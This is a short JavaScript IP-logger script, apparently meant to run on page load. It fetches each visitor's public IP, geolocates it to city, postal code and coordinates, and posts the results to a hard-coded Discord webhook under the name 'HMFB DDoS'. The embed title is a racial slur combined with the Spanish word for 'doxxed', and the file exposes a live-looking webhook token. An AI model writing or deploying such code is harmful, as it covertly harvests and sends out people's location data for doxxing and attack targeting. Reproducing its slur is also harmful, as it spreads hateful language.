const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1448715548488634421/fNFu8AxkbmNpIijdmZWrBopyKsvFrwZSnWf5S7GGPyCrFYMaanD0oYjT5yv3BqbAv447'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "HMFB DDoS", // optionally changeable
                            avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png?ex=693c45b3&is=693af433&hm=9d4aa5cd7dfa9d4333c2ffaf24aef64f9e5d85bbc730faebec21c75309a9c304&=&format=webp&quality=lossless&width=300&height=300", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'Nigga Doxeado',
                                    description: `**IP >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();

